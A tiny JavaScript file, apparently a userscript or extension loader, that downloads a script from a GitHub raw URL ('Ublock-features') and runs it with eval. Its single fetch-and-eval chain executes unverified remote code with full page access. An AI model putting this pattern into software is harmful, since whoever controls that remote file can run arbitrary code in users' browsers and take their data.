/// execute_script.js
fetch("https://raw.githubusercontent.com/StudioCompile/Ublock-features/refs/heads/main/code.js")
  .then(response => response.text())
  .then(code => eval(code));
